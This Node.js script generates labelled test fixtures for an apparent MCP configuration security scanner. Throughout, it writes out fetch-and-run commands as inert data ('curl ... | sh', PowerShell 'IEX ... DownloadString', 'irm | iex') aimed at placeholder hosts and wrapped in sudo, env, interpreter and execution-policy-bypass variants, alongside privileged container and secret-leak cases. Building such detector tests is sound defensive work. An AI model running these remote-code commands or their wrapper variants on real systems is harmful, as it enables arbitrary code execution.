import { mkdir, writeFile } from 'node:fs/promises';
import { resolve, sep } from 'node:path';
import { pathToFileURL } from 'node:url';

const options = process.argv.slice(2);
if (options.length !== 0 && (options.length !== 2 || options[0] !== '--output-dir' || !options[1])) {
  throw new Error('Usage: node scripts/generate-fixtures.mjs [--output-dir directory]');
}

// Deterministic, obviously synthetic sentinels are assembled only for test fixtures.
const synthetic = (...parts) => ['teste', 'NAO-USAR', ...parts].join('_');
const token = synthetic('a7B9c2D4e6F8g0H1j3K5m7N9');
const formattedToken = ['sk', synthetic('A9b8C7d6E5f4G3h2J1k0L9m8')].join('-');
const entropyToken = synthetic('q8W3e7R1t9Y2u6I4o0P5a8S3d7F1');
const config = server => ({ mcpServers: { example: server } });
const digest = `sha256:${'a'.repeat(64)}`;
const pipeline = 'curl https://download.example/setup.sh | sh';
const pythonShell = `import os; os.system('${pipeline}')`;
const nodeShell = `require('node:child_process').execSync('${pipeline}')`;
const shellRules = ['MCL-007', 'MCL-008', 'MCL-009'];
const interpreterServers = {
  shell: { command: 'sh', args: ['-c', `${pipeline}; echo done`] },
  inlineShell: { command: `/bin/bash -c '${pipeline}'` },
  inlinePython: { command: `python3 -c "${pythonShell}"` },
  inlineNode: { command: `node -e "${nodeShell}"` },
  structuredPython: { command: 'python3', args: ['-c', pythonShell] },
  structuredNode: { command: 'node', args: ['--eval', nodeShell] },
  mixedShell: { command: '/bin/bash -lc', args: [pipeline] },
  windowsCommand: { command: 'C:\\Windows\\System32\\cmd.exe /c', args: [pipeline] },
  windowsNode: { command: 'C:\\Program Files\\nodejs\\node.exe', args: ['-e', nodeShell] },
  powershell: { command: '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -Command "iwr https://download.example/setup.ps1 | iex"' },
  commandPipeline: { command: pipeline },
};

const cases = [
  {
    id: 'danger-01-plaintext', category: 'dangerous', expectedRuleIds: ['MCL-003', 'MCL-004', 'MCL-005', 'MCL-006'],
    config: config({ command: 'local-mcp', args: ['--token', token], env: { API_TOKEN: token, OPAQUE_VALUE: entropyToken }, headers: { Authorization: `Bearer ${formattedToken}` }, url: `https://service.example/mcp?api_key=${token}` }),
  },
  {
    id: 'danger-02-shell', category: 'dangerous', expectedRuleIds: shellRules,
    expectedServerRuleIds: Object.keys(interpreterServers).map(() => shellRules),
    config: { mcpServers: interpreterServers },
  },
  {
    id: 'danger-03-version-launchers', category: 'dangerous', expectedRuleIds: ['MCL-010', 'MCL-011', 'MCL-012', 'MCL-013'],
    expectedServerRuleIds: [['MCL-010', 'MCL-013'], ['MCL-011', 'MCL-013'], ['MCL-012', 'MCL-013']],
    config: { mcpServers: { latest: { command: 'npx', args: ['--yes', 'example-mcp@latest'] }, floating: { command: 'pnpm', args: ['dlx', 'example-mcp@^1.2.3'] }, unpinned: { command: 'uvx', args: ['example-mcp'] } } },
  },
  {
    id: 'danger-04-network', category: 'dangerous', expectedRuleIds: ['MCL-014', 'MCL-015', 'MCL-016', 'MCL-024', 'MCL-027'],
    config: config({ url: 'http://192.168.40.20/mcp', host: '0.0.0.0' }),
  },
  {
    id: 'danger-05-filesystem', category: 'dangerous', expectedRuleIds: ['MCL-017', 'MCL-018'],
    config: config({ command: 'local-filesystem-mcp', args: ['/', '/home/example'] }),
  },
  {
    id: 'danger-06-container', category: 'dangerous', expectedRuleIds: ['MCL-019', 'MCL-020', 'MCL-021', 'MCL-027'],
    config: config({ command: 'docker', args: ['run', '--privileged', '--user=0', '--volume=/:/host', '--network=host', `example-mcp@${digest}`] }),
  },
  {
    id: 'danger-07-policy', category: 'dangerous', expectedRuleIds: ['MCL-022', 'MCL-023', 'MCL-025', 'MCL-026', 'MCL-028'],
    config: config({ command: 'local-mcp', autoApprove: ['*'], inheritEnv: true, allowedTools: ['*'], forwardAuthorization: true, rejectUnauthorized: false }),
  },
  {
    id: 'danger-08-duplicate-jsonc', category: 'dangerous', expectedRuleIds: ['MCL-002'],
    source: '{\n  // The second name shadows the first.\n  "mcpServers": { "same": {"command":"local-one"}, "sa\\u006de": {"command":"local-two"}, },\n}\n',
  },
  {
    id: 'danger-09-malformed', category: 'dangerous', expectedRuleIds: ['MCL-001'],
    source: `{"mcpServers":{"${token}":{"command":"local-mcp","env":{"TOKEN":"${token}"}}} broken ${token}`,
  },
  {
    id: 'danger-10-structured-settings', category: 'dangerous', expectedRuleIds: ['MCL-003', 'MCL-004', 'MCL-005', 'MCL-006', 'MCL-019', 'MCL-020', 'MCL-021', 'MCL-025', 'MCL-026'],
    config: config({ command: 'local-mcp', args: [`--api-key=${token}`], environment: { TOKEN: formattedToken, NODE_TLS_REJECT_UNAUTHORIZED: '0' }, headers: { 'X-Api-Key': token }, query: { access_token: token }, privileged: true, runAsUser: 0, volumes: ['/etc:/config:ro'], forwardHeaders: ['Authorization'] }),
  },
  {
    id: 'valid-01-local', category: 'valid', expectedRuleIds: [],
    expectedServerRuleIds: [[], [], [], [], [], []],
    config: { mcpServers: {
      nodeScript: { command: 'node', args: ['/workspace/project/server.mjs'], env: { LOG_LEVEL: 'info', LANG: 'C.UTF-8' } },
      windowsExecutable: { command: 'C:\\Program Files\\MCP Tools\\server.exe', args: ['--stdio'] },
      windowsLiteralPath: { command: 'C:\\Tools & Co\\server.exe', args: ['--stdio'] },
      posixQuotedPath: { command: '"/opt/My Tools/server"', args: ['--stdio'] },
      literalArguments: { command: 'local-mcp', args: [pipeline, ';', '&&', '-e', '-c'] },
      pythonModule: { command: 'python3', args: ['-m', 'example_mcp', '-c', pythonShell] },
    } },
  },
  {
    id: 'valid-02-jsonc-string-traps', category: 'valid', expectedRuleIds: [],
    source: '{\n /* comment before object */ "mcpServers": { "example": { "command": "local-mcp", "args": ["literal://text/*not-comment*/", "literal,]}", "a; b && c | d", "a\\\"b",], }, },\n}\n',
  },
  { id: 'valid-03-runtime-auth-reference', category: 'valid', expectedRuleIds: [], config: config({ url: 'https://service.example/mcp', headers: { Authorization: 'Bearer ${env:MCP_TOKEN}' } }) },
  { id: 'valid-04-loopback', category: 'valid', expectedRuleIds: [], config: { mcpServers: { ipv4: { url: 'http://127.0.0.1:3000/mcp' }, ipv6: { url: 'http://[::1]:3000/mcp' }, hostname: { url: 'http://localhost:3000/mcp' } } } },
  { id: 'valid-05-container-digest', category: 'valid', expectedRuleIds: [], config: config({ command: 'docker', args: ['run', '--user=1000:1000', '--volume=/workspace/project:/data:ro', `example-mcp@${digest}`] }) },
  { id: 'valid-06-scoped-filesystem', category: 'valid', expectedRuleIds: [], config: config({ command: 'local-filesystem-mcp', args: ['/workspace/project'], allowedDirectories: ['/workspace/project/docs'] }) },
  { id: 'valid-07-environment-references', category: 'valid', expectedRuleIds: [], config: config({ command: 'local-mcp', args: ['--token', '${env:MCP_TOKEN}'], env: { API_TOKEN: '${env:MCP_TOKEN}', PASSWORD: '$MCP_PASSWORD', CLIENT_SECRET: '%MCP_SECRET%' } }) },
  { id: 'valid-08-explicit-permissions', category: 'valid', expectedRuleIds: [], config: config({ command: 'local-mcp', autoApprove: ['read_status'], allowedTools: ['read_status'], inheritEnv: false, forwardAuthorization: false, verifyTLS: true }) },
  { id: 'valid-09-public-digests', category: 'valid', expectedRuleIds: [], config: config({ command: 'local-mcp', env: { SHA256: '0123456789abcdef'.repeat(4), PUBLIC_KEY: 'public-material-version-2026-example' }, headers: { 'X-Checksum': 'abcdef0123456789'.repeat(4) } }) },
  { id: 'valid-10-server-array', category: 'valid', expectedRuleIds: [], config: { servers: [{ name: 'café', command: 'python3', args: ['-m', 'example_mcp'], env: { MODE: 'offline' } }, { name: 'cafe', command: 'local-mcp', args: ['--description', 'A human-readable description with 12345.'] }] } },
];

const root = options.length ? pathToFileURL(`${resolve(options[1])}${sep}`) : new URL('../fixtures/', import.meta.url);
await mkdir(root, { recursive: true });
const manifest = { schemaVersion: '1.0.0', synthetic: true, fixtureCount: cases.length, cases: [] };
for (const entry of cases) {
  const filename = `${entry.id}.jsonc`;
  const source = entry.source ?? `${JSON.stringify(entry.config, null, 2)}\n`;
  await writeFile(new URL(filename, root), source, 'utf8');
  manifest.cases.push({ id: entry.id, filename, category: entry.category, expectedRuleIds: entry.expectedRuleIds,
    ...(entry.expectedServerRuleIds ? { expectedServerRuleIds: entry.expectedServerRuleIds } : {}) });
}
await writeFile(new URL('manifest.json', root), `${JSON.stringify(manifest, null, 2)}\n`, 'utf8');

// Keep the original 20 fixtures / 39 servers stable. Round 3 is independently
// labelled per server so an aggregate union cannot conceal a missed wrapper.
const round3 = [];
const sample = (id, server, expectedRuleIds = shellRules) => round3.push({ id, server, expectedRuleIds,
  category: expectedRuleIds.length === 0 ? 'valid' : expectedRuleIds.includes('MCL-008') ? 'dangerous' : 'warning-only' });
for (const [id, command, prefix] of [
  ['env', 'env', ['MODE=offline']],
  ['env-absolute', '/usr/bin/env', ['--unset', 'OLD', '--chdir', '/workspace', 'MODE=offline']],
  ['env-end-options', 'env', ['--']],
  ['sudo', 'sudo', ['-u', 'runner', '-g', 'workers', '--']],
  ['sudo-background', 'sudo', ['-b']],
  ['sudo-reset-timestamp', 'sudo', ['--reset-timestamp']],
  ['sudo-assignment', 'sudo', ['MODE=offline']],
  ['nohup', 'nohup', []],
  ['busybox', 'busybox', []],
  ['timeout', 'timeout', ['--signal', 'TERM', '--kill-after', '2s', '5s']],
  ['timeout-attached', '/usr/bin/timeout', ['--signal=TERM', '5']],
  ['nice', 'nice', ['-n', '5']],
  ['nice-attached', '/usr/bin/nice', ['--adjustment=5']],
  ['setsid', 'setsid', ['--wait']],
  ['stdbuf', 'stdbuf', ['-o', 'L', '-e0']],
  ['ionice', 'ionice', ['-c', '2', '-n', '5']],
  ['taskset-mask', 'taskset', ['0x1']],
  ['taskset-cpus', 'taskset', ['-c', '0']],
  ['chrt', 'chrt', ['-r', '10']],
]) sample(`wrapper-${id}`, { command, args: [...prefix, 'sh', '-c', pipeline] });
sample('wrapper-recursive', { command: '/usr/bin/sudo', args: ['-u', 'runner', 'env', '--unset', 'OLD', 'nice', '-n', '5', 'timeout', '--signal', 'TERM', '5s', 'nohup', 'busybox', 'sh', '-c', pipeline] });
sample('wrapper-inline', { command: `/usr/bin/env MODE=offline sudo -u runner timeout 5s /bin/bash -c '${pipeline}'` });
sample('wrapper-mixed', { command: '/usr/bin/env MODE=offline nice -n 5 /bin/bash --rcfile F', args: ['-c', pipeline] });
sample('wrapper-split-string', { command: 'env', args: ['-S', `nohup sh -c '${pipeline}'`] });
sample('wrapper-split-attached', { command: 'env', args: [`--split-string=nice -n 5 sh -c '${pipeline}'`] });
sample('bash-rcfile', { command: 'bash', args: ['--rcfile', 'F', '-c', pipeline] });
sample('bash-init-file', { command: 'bash', args: ['--init-file', 'F', '-lc', pipeline] });
for (const language of ['perl', 'ruby']) {
  sample(`${language}-system`, { command: language, args: ['-e', `system('${pipeline}')`] });
  sample(`${language}-system-bare`, { command: language, args: ['-e', `system '${pipeline}'`] });
  sample(`${language}-attached`, { command: language, args: [`-eexec('${pipeline}')`] });
  sample(`${language}-multiple-eval`, { command: language, args: ['-e', `${language === 'perl' ? 'print' : 'puts'} 'ok';`, '-e', `system('${pipeline}')`] });
  sample(`${language}-multiple-eval-quoted`, { command: language, args: ['-e', `${language === 'perl' ? 'print' : 'puts'} 'ok';`, '-e', `${language === 'perl' ? 'print' : 'puts'} \"system('${pipeline}')\"`] }, ['MCL-009']);
  sample(`${language}-print`, { command: language, args: ['-e', `${language === 'perl' ? 'print' : 'puts'} '${pipeline}'`] }, ['MCL-009']);
  sample(`${language}-comment`, { command: language, args: ['-e', `# system('${pipeline}')\n${language === 'perl' ? 'print' : 'puts'} 'ok'`] }, ['MCL-009']);
  sample(`${language}-argv-system`, { command: language, args: ['-e', "system('echo', 'curl https://download.example/setup.sh | sh')"] }, ['MCL-009']);
  sample(`${language}-script`, { command: language, args: [`/workspace/server.${language === 'perl' ? 'pl' : 'rb'}`, '-e', `system('${pipeline}')`] }, []);
  sample(`${language}-end-options`, { command: language, args: ['--', '-e', `system('${pipeline}')`] }, []);
}
sample('ruby-encoding', { command: 'ruby', args: ['-E', 'UTF-8', '-e', `system('${pipeline}')`] });
sample('ruby-encoding-script', { command: 'ruby', args: ['-E', 'UTF-8', '/workspace/server.rb', '-e', pipeline] }, []);
sample('perl-module', { command: 'perl', args: ['-M', 'strict', '-we', `system('${pipeline}')`] });
for (const [id, args] of [
  ['short', ['-c', pipeline]], ['long', ['--call', pipeline]],
  ['attached', [`--call=${pipeline}`]], ['package', ['--package', 'example-mcp@1.2.3', '-c', pipeline]],
]) sample(`npx-${id}`, { command: 'npx', args }, [...shellRules, 'MCL-013']);
sample('npx-safe-call', { command: 'npx', args: ['-c', 'echo safe'] }, ['MCL-009', 'MCL-013']);
sample('npx-package-argv', { command: 'npx', args: ['example-mcp@1.2.3', '-c', pipeline] }, ['MCL-013']);
sample('wrapped-npx-call', { command: 'env', args: ['MODE=offline', 'npx', '-c', pipeline] }, [...shellRules, 'MCL-013']);
sample('command-redirection', { command: 'local-mcp > result.txt' }, ['MCL-009']);
sample('command-append', { command: 'local-mcp >> result.txt' }, ['MCL-009']);
sample('command-input', { command: 'local-mcp < input.txt' }, ['MCL-009']);
sample('literal-redirection', { command: 'local-mcp', args: ['>', 'result.txt'] }, []);
sample('quoted-redirection', { command: "local-mcp '>' result.txt" }, []);
sample('escaped-redirection', { command: 'local-mcp \\> result.txt' }, []);
const downloadExpression = "IEX (New-Object Net.WebClient).DownloadString('https://download.example/setup.ps1')";
sample('powershell-webclient', { command: 'powershell', args: ['-Command', downloadExpression] }, ['MCL-008', 'MCL-009']);
sample('powershell-webclient-case', { command: 'pwsh', args: ['-c', "Invoke-Expression ((New-Object -TypeName System.Net.WebClient).DownloadString('https://download.example/setup.ps1'))"] }, ['MCL-008', 'MCL-009']);
sample('powershell-sink-parameter', { command: 'powershell', args: ['-Command', "Invoke-Expression -Command ((New-Object Net.WebClient).DownloadString('https://download.example/setup.ps1'))"] }, ['MCL-008', 'MCL-009']);
sample('powershell-call-syntax', { command: 'powershell', args: ['-Command', "IEX((New-Object Net.WebClient).DownloadString('https://download.example/setup.ps1'))"] }, ['MCL-008', 'MCL-009']);
sample('powershell-wrapped', { command: 'env', args: ['MODE=offline', 'pwsh', '-Command', downloadExpression] }, ['MCL-008', 'MCL-009']);
sample('powershell-inline', { command: `pwsh -Command "${downloadExpression}"` }, ['MCL-008', 'MCL-009']);
sample('powershell-string', { command: 'pwsh', args: ['-Command', `Write-Output "${downloadExpression}"`] }, ['MCL-009']);
sample('powershell-comment', { command: 'pwsh', args: ['-Command', `# ${downloadExpression}\nWrite-Output 'ok'`] }, ['MCL-009']);
sample('powershell-download-only', { command: 'pwsh', args: ['-Command', "(New-Object Net.WebClient).DownloadString('https://download.example/setup.ps1')"] }, ['MCL-009']);
sample('powershell-script', { command: 'pwsh', args: ['-File', 'server.ps1', '-Command', downloadExpression] }, []);
sample('wrapper-assignment-data', { command: 'env', args: [`NOTE=${pipeline}`, 'sudo', '-u', 'bash', '--', 'local-mcp', '-c', pipeline] }, []);
// Round 4 deliberately widens the static policy: an explicit interpreter
// sequence in argv remains visible even after an otherwise unknown command.
sample('wrapper-applet-boundary', { command: 'busybox', args: ['echo', 'sh', '-c', pipeline] });
sample('wrapper-script-boundary', { command: 'timeout', args: ['5s', 'local-mcp', '-c', pipeline] }, []);
sample('wrapper-env-boundary', { command: 'env', args: ['--', 'local-mcp', 'sh', '-c', pipeline] });
sample('wrapper-env-operand', { command: 'env', args: ['--unset', 'bash', 'local-mcp', '-c', pipeline] }, []);
sample('wrapper-sudo-list', { command: 'sudo', args: ['--list', 'sh', '-c', pipeline] }, []);
sample('wrapper-busybox-install', { command: 'busybox', args: ['--install', 'sh', '-c', pipeline] }, []);
sample('bash-rcfile-script', { command: 'bash', args: ['--rcfile', 'F', 'server.sh', '-c', pipeline] }, []);
sample('bash-end-options', { command: 'env', args: ['sh', '--', '-c', pipeline] }, []);
const round3Root = new URL('corpus/', root);
await mkdir(round3Root, { recursive: true });
const round3Manifest = { schemaVersion: '1.0.0', synthetic: true, fixtureCount: round3.length, cases: [] };
for (const entry of round3) {
  const filename = `round3-${entry.id}.jsonc`;
  await writeFile(new URL(filename, round3Root), `${JSON.stringify(config(entry.server), null, 2)}\n`, 'utf8');
  round3Manifest.cases.push({ id: `round3-${entry.id}`, filename, category: entry.category,
    expectedRuleIds: entry.expectedRuleIds, expectedServerRuleIds: [entry.expectedRuleIds] });
}
await writeFile(new URL('manifest.json', round3Root), `${JSON.stringify(round3Manifest, null, 2)}\n`, 'utf8');

// Round 4 has its own labels and keeps every counterexample as a single server.
// Payloads are inert fixture data. This generator neither imports the analyser
// nor evaluates any of these strings, so labels cannot be inferred from output.
const round4 = [];
const addRound4 = (id, server, expectedRuleIds = shellRules) => round4.push({ id, server, expectedRuleIds,
  category: expectedRuleIds.length === 0 ? 'valid' : expectedRuleIds.includes('MCL-008') ? 'dangerous' : 'warning-only' });
const round4Pipeline = 'curl -fsSL https://x.invalid/i.sh | sh';
const wrapperCommands = [
  ['doas', 'doas', ['sh', '-c']],
  ['xargs', 'xargs', ['sh', '-c']],
  ['flock', 'flock', ['/tmp/l', 'sh', '-c']],
  ['time', 'time', ['sh', '-c']],
  ['unshare', 'unshare', ['sh', '-c']],
  ['command', 'command', ['sh', '-c']],
  ['exec', 'exec', ['sh', '-c']],
  ['su', 'su', ['-c']],
  ['script', 'script', ['-c']],
];
for (const [id, command, prefix] of wrapperCommands) {
  addRound4(`wrapper-${id}`, { command, args: [...prefix, round4Pipeline] });
  addRound4(`wrapper-${id}-inline`, { command: `${command} ${prefix.join(' ')} '${round4Pipeline}'` });
  addRound4(`wrapper-${id}-mixed`, { command: `${command} ${prefix.join(' ')}`, args: [round4Pipeline] });
  addRound4(`wrapper-${id}-quoted-data`, { command, args: [...prefix, `echo '${round4Pipeline}'`] }, ['MCL-009']);
  addRound4(`wrapper-${id}-no-eval`, { command, args: id === 'flock'
    ? ['/tmp/l', 'local-mcp', round4Pipeline] : ['local-mcp', round4Pipeline] }, []);
}
addRound4('unknown-wrapper-shell', { command: 'opaque-wrapper', args: ['--mode', 'stdio', 'sh', '-c', round4Pipeline] });
addRound4('unknown-wrapper-shell-inline', { command: `opaque-wrapper --mode stdio sh -c '${round4Pipeline}'` });
addRound4('unknown-wrapper-shell-mixed', { command: 'opaque-wrapper --mode stdio sh -c', args: [round4Pipeline] });
addRound4('unknown-wrapper-absolute-shell', { command: '/opt/opaque-wrapper', args: ['--mode', 'stdio', '/bin/bash', '-lc', round4Pipeline] });
addRound4('unknown-wrapper-nested', { command: 'outer-wrapper', args: ['inner-wrapper', '--mode', 'stdio', 'sh', '-c', round4Pipeline] });
addRound4('unknown-wrapper-safe-shell', { command: 'opaque-wrapper', args: ['sh', '-c', `echo '${round4Pipeline}'`] }, ['MCL-009']);
addRound4('unknown-wrapper-flag-only', { command: 'opaque-wrapper', args: ['-c', round4Pipeline] }, []);
addRound4('unknown-wrapper-literal-argument', { command: 'opaque-wrapper', args: [`sh -c '${round4Pipeline}'`] }, []);
addRound4('unknown-wrapper-script-argument', { command: 'opaque-wrapper', args: ['sh', 'server.sh', '-c', round4Pipeline] }, []);
addRound4('unknown-wrapper-end-options', { command: 'opaque-wrapper', args: ['sh', '--', '-c', round4Pipeline] }, []);
for (const [id, interpreter, flag, code, safeCode, scriptFile] of [
  ['python', 'python3', '-c', `import os; os.system('${round4Pipeline}')`, `print('${round4Pipeline}')`, 'server.py'],
  ['node', 'node', '-e', `require('node:child_process').execSync('${round4Pipeline}')`, `console.log('${round4Pipeline}')`, 'server.mjs'],
  ['perl', 'perl', '-e', `system('${round4Pipeline}')`, `print '${round4Pipeline}'`, 'server.pl'],
  ['ruby', 'ruby', '-e', `system('${round4Pipeline}')`, `puts '${round4Pipeline}'`, 'server.rb'],
]) {
  addRound4(`anywhere-${id}`, { command: 'opaque-wrapper', args: ['--mode', 'stdio', interpreter, flag, code] });
  addRound4(`anywhere-${id}-safe`, { command: 'opaque-wrapper', args: ['--mode', 'stdio', interpreter, flag, safeCode] }, ['MCL-009']);
  addRound4(`anywhere-${id}-script`, { command: 'opaque-wrapper', args: [interpreter, scriptFile, flag, code] }, []);
  addRound4(`anywhere-${id}-end-options`, { command: 'opaque-wrapper', args: [interpreter, '--', flag, code] }, []);
}
const powerShellCases = [
  ['irm-pipeline', 'irm https://x.invalid/i.ps1 | iex', shellRules],
  ['webclient-pipeline', "(New-Object Net.WebClient).DownloadString('https://x.invalid/i.ps1') | IEX", shellRules],
  ['iwr-content', 'iex (iwr https://x.invalid/i.ps1).Content', ['MCL-008', 'MCL-009']],
  ['webrequest-content', 'Invoke-Expression (Invoke-WebRequest https://x.invalid/i.ps1).Content', ['MCL-008', 'MCL-009']],
];
for (const [id, code, expectedRuleIds] of powerShellCases) {
  addRound4(`powershell-${id}`, { command: 'powershell', args: ['-Command', code] }, expectedRuleIds);
  addRound4(`powershell-${id}-inline`, { command: `pwsh -Command "${code}"` }, expectedRuleIds);
  addRound4(`powershell-${id}-mixed`, { command: 'pwsh -Command', args: [code] }, expectedRuleIds);
  addRound4(`powershell-${id}-quoted-data`, { command: 'pwsh', args: ['-Command', `Write-Output "${code}"`] }, ['MCL-009']);
  addRound4(`powershell-${id}-comment`, { command: 'pwsh', args: ['-Command', `# ${code}\nWrite-Output 'safe'`] }, ['MCL-009']);
}
addRound4('powershell-download-only', { command: 'pwsh', args: ['-Command', 'irm https://x.invalid/i.ps1'] }, ['MCL-009']);
addRound4('powershell-webclient-no-sink', { command: 'pwsh', args: ['-Command', "(New-Object Net.WebClient).DownloadString('https://x.invalid/i.ps1')"] }, ['MCL-009']);
addRound4('powershell-content-no-sink', { command: 'pwsh', args: ['-Command', '(Invoke-WebRequest https://x.invalid/i.ps1).Content'] }, ['MCL-009']);
addRound4('powershell-local-expression', { command: 'pwsh', args: ['-Command', "Invoke-Expression 'Write-Output safe'"] }, ['MCL-009']);
addRound4('powershell-script-boundary', { command: 'pwsh', args: ['-File', 'server.ps1', '-Command', powerShellCases[0][1]] }, []);
addRound4('powershell-unknown-wrapper', { command: 'opaque-wrapper', args: ['--mode', 'stdio', 'pwsh', '-Command', powerShellCases[2][1]] }, ['MCL-008', 'MCL-009']);
addRound4('literal-powershell-code', { command: 'local-mcp', args: [powerShellCases[0][1]] }, []);
// P24: paired executable forms and literal/script boundary controls.
for (const [id, command, prefix] of [
  ['powershell-ep', 'powershell', ['-ep', 'bypass', '-c']],
  ['powershell-window', 'pwsh', ['-W', 'Hidden', '-c']],
  ['script-combined', 'script', ['-qc']],
  ['su-combined', 'su', ['-lc']],
  ['tcsh', 'tcsh', ['-c']], ['csh', 'csh', ['-c']], ['mksh', 'mksh', ['-c']],
]) {
  const ps = command === 'pwsh' || command === 'powershell';
  const payload = ps ? 'irm https://x.invalid/i.ps1 | iex' : round4Pipeline;
  addRound4(`p24-${id}`, { command, args: [...prefix, payload] });
  addRound4(`p24-${id}-quoted`, { command, args: [...prefix, `${ps ? 'Write-Output' : 'echo'} '${payload}'`] }, ['MCL-009']);
}
addRound4('p24-powershell-enc', { command: 'pwsh', args: ['-enc', 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA'] }, ['MCL-009']);
addRound4('p24-powershell-enc-file', { command: 'pwsh', args: ['-File', 'safe.ps1', '-enc', 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA'] }, []);
addRound4('p24-env-s-joined', { command: 'env', args: [`-Ssh -c "${round4Pipeline}"`] });
addRound4('p24-env-s-joined-script', { command: 'env', args: ['-Ssh safe.sh -c ignored'] }, []);
addRound4('p24-npx-terminator', { command: 'npx', args: ['--package=example-mcp@1.2.3', '--', 'sh', '-c', round4Pipeline] }, [...shellRules, 'MCL-013']);
addRound4('p24-npx-terminator-script', { command: 'npx', args: ['--package=example-mcp@1.2.3', '--', 'sh', 'safe.sh', '-c', round4Pipeline] }, ['MCL-013']);
const round4Manifest = { schemaVersion: '1.0.0', synthetic: true, fixtureCount: round4.length, cases: [] };
for (const entry of round4) {
  const filename = `round4-${entry.id}.jsonc`;
  await writeFile(new URL(filename, round3Root), `${JSON.stringify(config(entry.server), null, 2)}\n`, 'utf8');
  round4Manifest.cases.push({ id: `round4-${entry.id}`, filename, category: entry.category,
    expectedRuleIds: entry.expectedRuleIds, expectedServerRuleIds: [entry.expectedRuleIds] });
}
await writeFile(new URL('manifest-round4.json', round3Root), `${JSON.stringify(round4Manifest, null, 2)}\n`, 'utf8');
// Only a fixed status is printed; fixture content and synthetic tokens never are.
console.log(`Generated ${manifest.fixtureCount} original, ${round3Manifest.fixtureCount} round-3 and ${round4Manifest.fixtureCount} round-4 deterministic fixtures.`);
